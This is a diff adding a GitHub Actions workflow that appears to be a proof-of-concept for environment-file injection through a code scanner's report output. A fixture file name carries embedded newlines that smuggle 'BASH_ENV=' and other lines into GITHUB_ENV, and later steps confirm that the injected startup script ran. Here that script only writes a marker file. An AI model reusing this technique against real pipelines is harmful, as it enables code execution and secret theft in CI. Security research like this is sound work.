@@ -1,0 +1,94 @@
+name: T1 Hosted GITHUB_ENV Line Tolerance
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  env-line-tolerance:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Prepare Checks scan fixture
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf scan-root
+          mkdir -p scan-root
+          python3 - <<'PY'
+          from pathlib import Path
+
+          source = """\
+          import android.provider.Settings;
+
+          class Payload {
+            void leak(android.content.ContentResolver cr) {
+              String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
+              String marker = "T1_GITHUB_ENV_LINE_TOLERANCE_20260605";
+            }
+          }
+          """
+          Path("scan-root/Control.java").write_text(source)
+          name = (
+              "EnvLineProbe\n"
+              "T1_ENV_LINE_ACCEPTED=T1_ENV_LINE_TOLERANCE_20260605\n"
+              "BASH_ENV=t1_bash_env.sh\n"
+              "Payload.java"
+          )
+          Path("scan-root", name).write_text(source)
+          Path("t1_bash_env.sh").write_text(
+              "printf 'T1_BASH_ENV_EXECUTED_20260605\\n' > t1_bash_env_marker.txt\\n"
+          )
+          PY
+          find scan-root -maxdepth 1 -type f -printf 'fixture-file=%p\n'
+          printf 'bash-env-script=%s\n' "$(sed -n '1p' t1_bash_env.sh)"
+
+      - name: Install Checks CLI
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl --compressed https://dl.google.com/checks/cli/latest/checks-linux -o checks
+          chmod +x ./checks
+          ./checks --version
+
+      - name: Write Checks HTML report into actual GITHUB_ENV
+        shell: bash
+        run: |
+          set -euo pipefail
+          printf 'github-env-path=%s\n' "$GITHUB_ENV"
+          ./checks code scan scan-root \
+            --skip-upload \
+            --format=html \
+            --output "$GITHUB_ENV" \
+            --account-id=1 \
+            --repo-id=1 \
+            --scm-remote-url=https://github.com/cllc3993/checks-s1-ci-impact-poc \
+            --branch-name=t1-env-line-tolerance \
+            --scm-revision="T1_ENV_LINE_TOLERANCE_${GITHUB_RUN_ID}_${GITHUB_RUN_ATTEMPT}" \
+            --disable-analytics \
+            --disable-version-check \
+            --no-input
+          printf 'github-env-first-line=%s\n' "$(sed -n '1p' "$GITHUB_ENV")"
+          grep -n 'T1_ENV_LINE_ACCEPTED\|BASH_ENV' "$GITHUB_ENV" || true
+
+      - name: Verify hosted runner applied harmless env line
+        shell: bash
+        run: |
+          set -euo pipefail
+          printf 'observed-T1_ENV_LINE_ACCEPTED=%s\n' "${T1_ENV_LINE_ACCEPTED-}"
+          test "${T1_ENV_LINE_ACCEPTED-}" = "T1_ENV_LINE_TOLERANCE_20260605"
+          printf 'T1_GITHUB_ENV_LINE_TOLERANCE_RESULT=accepted\n'
+
+      - name: Verify BASH_ENV startup effect
+        shell: bash
+        run: |
+          set -euo pipefail
+          printf 'observed-BASH_ENV=%s\n' "${BASH_ENV-}"
+          test "${BASH_ENV-}" = "t1_bash_env.sh"
+          test -f t1_bash_env_marker.txt
+          cat t1_bash_env_marker.txt
+          printf 'T1_GITHUB_ENV_BASH_ENV_RESULT=executed\n'
